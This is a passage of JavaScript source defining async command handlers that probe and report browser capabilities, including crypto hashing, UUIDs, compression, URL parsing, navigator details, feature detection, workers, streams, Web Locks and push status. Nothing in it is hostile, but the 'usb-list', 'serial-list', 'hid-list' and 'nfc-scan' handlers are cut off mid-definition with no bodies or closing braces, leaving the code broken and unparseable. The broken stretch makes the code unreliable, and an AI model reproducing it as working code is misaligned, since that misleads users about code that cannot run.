  return { text: `🎲 <b>Random ${n} bytes</b>\n<code>${hex}</code>` };
},
async 'crypto-hash'(args) {
  if (!args) throw new Error('text required');
  const buf = new TextEncoder().encode(args);
  const h = await crypto.subtle.digest('SHA-256', buf);
  const hex = [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, '0')).join('');
  return { text: `🔐 <b>SHA-256</b>\n<code>${hex}</code>` };
},
async 'crypto-uuid'() {
  return { text: `🆔 <b>UUID</b>\n<code>${crypto.randomUUID()}</code>` };
},
async compress(args) {
  if (!('CompressionStream' in window)) throw new Error('unsupported');
  const text = args || 'hello world '.repeat(100);
  const stream = new Blob([text]).stream().pipeThrough(new CompressionStream('gzip'));
  const buf = await new Response(stream).arrayBuffer();
  return { text: `📦 ${text.length} → ${buf.byteLength} bytes (${((1-buf.byteLength/text.length)*100).toFixed(1)}% saved)` };
},
async 'url-parse'(args) {
  const u = new URL(args || location.href);
  return { text: `🔗 <b>URL</b>\nprotocol: ${u.protocol}\nhost: ${u.host}\npathname: ${u.pathname}\nsearch: ${u.search}\nhash: ${u.hash}` };
},
async eyedropper() {
  if (!window.EyeDropper) throw new Error('unsupported');
  const r = await new EyeDropper().open();
  return { text: `🎨 Picked: <code>${r.sRGBHex}</code>` };
},
async 'navigator-info'() {
  const out = {
    uaData: navigator.userAgentData ? { brands: navigator.userAgentData.brands, mobile: navigator.userAgentData.mobile, platform: navigator.userAgentData.platform } : null,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory,
    touch: navigator.maxTouchPoints,
    pdf: navigator.pdfViewerEnabled,
    webdriver: navigator.webdriver,
    plugins: navigator.plugins?.length || 0
  };
  return { text: `🔍 <b>Navigator</b>\n<pre>${esc(JSON.stringify(out, null, 2))}</pre>` };
},
async 'browser-features'() {
  const f = {
    'ServiceWorker':'serviceWorker' in navigator,'WebWorker':'Worker' in window,'WebSocket':'WebSocket' in window,
    'WebRTC':'RTCPeerConnection' in window,'WebGL':!!document.createElement('canvas').getContext('webgl'),
    'WebGPU':'gpu' in navigator,'WebAssembly':'WebAssembly' in window,'WebAudio':'AudioContext' in window,
    'Bluetooth':'bluetooth' in navigator,'USB':'usb' in navigator,'Serial':'serial' in navigator,
    'HID':'hid' in navigator,'NFC':'NDEFReader' in window,'Gamepad':'getGamepads' in navigator,
    'SpeechSynth':'speechSynthesis' in window,'SpeechRec':'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
    'Notifications':'Notification' in window,'Geolocation':'geolocation' in navigator,'Vibration':'vibrate' in navigator,
    'Battery':'getBattery' in navigator,'WakeLock':'wakeLock' in navigator,'IdleDetection':'IdleDetector' in window,
    'FileSystemAccess':'showOpenFilePicker' in window,'Clipboard':'clipboard' in navigator,'Share':'share' in navigator,
    'Payment':'PaymentRequest' in window,'Credentials':'credentials' in navigator,'Push':'PushManager' in window,
    'BackgroundSync':'SyncManager' in window,'WebTransport':'WebTransport' in window,'WebCodecs':'VideoEncoder' in window,
    'CompressionStream':'CompressionStream' in window,'EyeDropper':'EyeDropper' in window,
    'ScreenCapture':'getDisplayMedia' in navigator.mediaDevices,'PiP':'pictureInPictureEnabled' in document,
    'AmbientLight':'AmbientLightSensor' in window,'Accelerometer':'Accelerometer' in window,
    'Gyroscope':'Gyroscope' in window,'Magnetometer':'Magnetometer' in window,'Proximity':'ProximitySensor' in window,
    'Contacts':'contacts' in navigator,'StorageBuckets':'storageBuckets' in navigator,
    'ComputePressure':'PressureObserver' in window,'WebLocks':'locks' in navigator
  };
  const s = Object.entries(f).filter(([,v])=>v).map(([k])=>`✓ ${k}`).join('\n');
  const n = Object.entries(f).filter(([,v])=>!v).map(([k])=>`✗ ${k}`).join('\n');
  return { text: `🚀 <b>Features (${Object.values(f).filter(Boolean).length}/${Object.keys(f).length})</b>\n\n<b>Supported</b>\n<code>${esc(s)}</code>\n\n<b>Unsupported</b>\n<code>${esc(n)}</code>` };
},
async ping() {
  const t = performance.now();
  await new Promise(r => setTimeout(r, 1));
  return { text: `🏓 Pong (${(performance.now()-t).toFixed(2)}ms)` };
},

async 'usb-list'() {

async 'serial-list'() {
  if (!navigator.serial) throw new Error('unsupported');

async 'hid-list'() {

async 'nfc-scan'() {

// ═══════ WORKERS / STREAMS ═══════
async 'worker-test'() {
  if (!window.Worker) throw new Error('unsupported');
  const blob = new Blob([`self.onmessage=e=>{let s=0;for(let i=0;i<e.data;i++)s+=i;self.postMessage(s)}`], { type: 'application/javascript' });
  const w = new Worker(URL.createObjectURL(blob));
  const t = performance.now();
  const r = await new Promise(ok => { w.onmessage = e => ok(e.data); w.postMessage(1e7); });
  w.terminate();
  return { text: `⚙️ <b>Worker</b>\nSum(0..10M) = ${r}\nTime: ${(performance.now()-t).toFixed(0)}ms` };
},
async 'broadcast-send'(args) {
  if (!('BroadcastChannel' in window)) throw new Error('unsupported');
  const ch = new BroadcastChannel('dv-test');
  ch.postMessage({ msg: args || 'hello', t: Date.now() });
  ch.close();
  return { text: `📢 Broadcast sent` };
},
async 'stream-test'() {
  if (!('ReadableStream' in window)) throw new Error('unsupported');
  const s = new ReadableStream({ start(c) { c.enqueue('chunk1\n'); c.enqueue('chunk2\n'); c.close(); } });
  const reader = s.getReader();
  const chunks = [];
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    chunks.push(value);
  }
  return { text: `🌊 <b>Streams</b>\n${chunks.length} chunks:\n<code>${esc(chunks.join(''))}</code>` };
},
async 'locks-test'() {
  if (!navigator.locks) throw new Error('unsupported');
  return await navigator.locks.request('test', async () => {
    await new Promise(r => setTimeout(r, 100));
    return { text: `🔒 Web Lock acquired & released` };
  });
},
async 'scheduler-info'() {
  if (!window.scheduler) throw new Error('unsupported');
  const p = await scheduler.postTask(() => 'done', { priority: 'user-visible' });
  return { text: `📅 Scheduler works: ${p}` };
},
async 'push-status'() {
  if (!('PushManager' in window)) throw new Error('unsupported');
  if (!navigator.serviceWorker.controller) return { text: `📬 No SW controller` };
  const reg = await navigator.serviceWorker.ready;
  const sub = await reg.pushManager.getSubscription();
  return { text: `📬 Push: ${sub ? sub.endpoint.slice(0, 80) + '…' : '(none)'}` };
}
};
